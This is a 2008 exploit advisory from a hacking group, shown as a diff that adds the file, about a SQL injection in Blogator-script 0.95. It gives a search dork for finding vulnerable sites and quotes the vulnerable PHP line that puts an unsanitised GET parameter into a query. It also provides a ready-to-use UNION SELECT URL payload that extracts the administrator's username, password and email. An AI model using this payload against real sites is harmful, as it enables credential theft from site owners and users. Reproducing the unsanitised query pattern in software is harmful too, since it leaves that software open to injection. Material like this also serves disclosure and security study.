@@ -1,0 +1,34 @@
+           
+             ########################################################################
+             #                                                                      #
+             #    ...:::::Blogator-script 0.95 SQL Injection Vulnerbility ::::....  #          
+             ########################################################################
+
+Virangar Security Team
+
+www.virangar.org
+www.virangar.net
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal) from emperor team :)
+-----------------------------------
+dork: inurl:/_blogadata/
+-----------------------------------
+vuln code in /_blogadata/include/sond_result.php:
+line 27: $id_art=$_GET['id_art'];
+......
+line 34: $sql_res=mysql_query("SELECT sond_rep, votes_H, votes_F FROM sondage_rep WHERE id_sond = $id_art ORDER BY ordre");
+------------
+vuln:
+http://www.site.com/_blogadata/include/sond_result.php?id_art=-99999/**/union/**/select/**/concat(pseudo,0x3a,pass,char(58),email),2,3/**/from/**/membre/**/where/**/id_membre=1/*
+--------------------------------
+you can see in Blogator-script other injection bugs too ;)
+
+# milw0rm.com [2008-04-04]
